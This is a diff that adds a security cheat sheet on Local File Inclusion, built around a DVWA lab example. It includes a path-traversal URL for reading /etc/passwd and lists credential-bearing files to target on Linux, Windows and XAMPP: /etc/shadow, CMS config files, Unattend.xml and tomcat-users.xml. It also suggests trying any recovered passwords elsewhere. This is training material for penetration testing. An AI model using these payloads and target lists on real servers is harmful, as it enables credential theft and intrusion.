@@ -1,5 +1,111 @@
 
+--- Local File Inclusion (LFI) ---
+
 Local File Inclusion (LFI) vulnerabilities allow an attacker to use specifically crafted requests to read local files on the web server (including log files and configuration files containing password hashes or even clear text passwords). 
 LFI vulnerabilities can also lead to remote code execution on the target web server and a denial of service (DoS).
 
 
+• LFI examples
+• Interesting files for LFI
+
+
+
+-- LFI examples --
+
+Click on View Source, we are shown the following lines of code:
+
+<?php
+
+    $file = $_GET['page']; // The page we wish to display
+
+?>
+
+From this we can see that if we change the contents of the page parameter in the address bar (i.e. to point to the address of the file) that file will be displayed on the index.php page.
+This means we have to change the current working directory on the target host to the etc directory. 
+The default web root directory for older Ubuntu Linux systems is often the '/var/www/' directory (later releases use '/var/www/html/'). 
+By looking at the address bar of our browser we can see that the vulnerable page is loaded from the '/dvwa/vulnerabilities/fi/' directory and the included file (include.php) from the same location:
+
+http://10.11.1.250/dvwa/vulnerabilities/fi/?page=include.php
+
+Current working directory on the target is most likely as follows: /var/www/dvwa/vulnerabilities/fi/
+
+http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
+
+
+-- Interesting files for LFI --
+
+➜ Linux
+
+• /etc/passwd
+• /etc/shadow
+• /etc/issue
+• /etc/group
+• /etc/hostname
+
+⇒ Log files
+
+• Apache access log: /var/log/apache/access.log
+• Apache access log: /var/log/apache2/access.log
+• Apache access log: /var/log/httpd/access_log
+• Apache error log: /var/log/apache/error.log
+• Apache error log: /var/log/apache2/error.log
+• Apache error log: /var/log/httpd/error_log
+• General messages and system related entries: /var/log/messages
+• Cron logs: /var/log/cron.log
+• Authentication logs: /var/log/secure or /var/log/auth.log
+
+⇒ Web application configuration files
+
+• WordPress: /var/www/html/wp-config.php
+• Joomla: /var/www/configuration.php
+• Dolphin CMS: /var/www/html/inc/header.inc.php
+• Drupal: /var/www/html/sites/default/settings.php
+• Mambo: /var/www/configuration.php
+• PHPNuke: /var/www/config.php
+• PHPbb: /var/www/config.php
+• OpenLiteSpeed: /opt/openlitespeed/ols.conf
+
+Don’t forget to check if any usernames and passwords you find are being re-used on other (web) applications!
+
+➜ Windows
+
+• C:/windows/System32/drivers/etc/hosts
+• C:/Windows/Panther/Unattend/Unattended.xml
+• C:/Windows/Panther/Unattended.xml
+• C:/Windows/Panther/Unattend.txt
+• C:/Unattend.xml
+• C:/Autounattend.xml
+• C:/Windows/system32/sysprep
+
+⇒ Web Root Directory
+
+• C:/inetpub/wwwroot/
+• C:/inetpub/wwwroot/web.config
+• C:/inetpub/logs/logfiles/
+
+⇒ Windows Systems
+
+• C:/documents and settings/administrator/desktop/desktop.ini
+• C:/documents and settings/administrator/ntuser.dat
+• C:/documents and settings/administrator/ntuser.ini
+• C:/users/administrator/desktop/desktop.ini
+• C:/users/administrator/ntuser.dat
+• C:/users/administrator/ntuser.ini
+• C:/windows/windowsupdate.log
+
+➜ XAMPP on Windows
+
+• C:/xampp/apache/conf/httpd.conf
+• C:/xampp/security/webdav.htpasswd
+• C:/xampp/apache/logs/access.log
+• C:/xampp/apache/logs/error.log
+• C:/xampp/tomcat/conf/tomcat-users.xml
+• C:/xampp/tomcat/conf/web.xml
+• C:/xampp/webalizer/webalizer.conf
+• C:/xampp/webdav/webdav.txt
+• C:/xampp/apache/bin/php.ini
+• C:/xampp/apache/conf/httpd.conf
+
+
+
+*
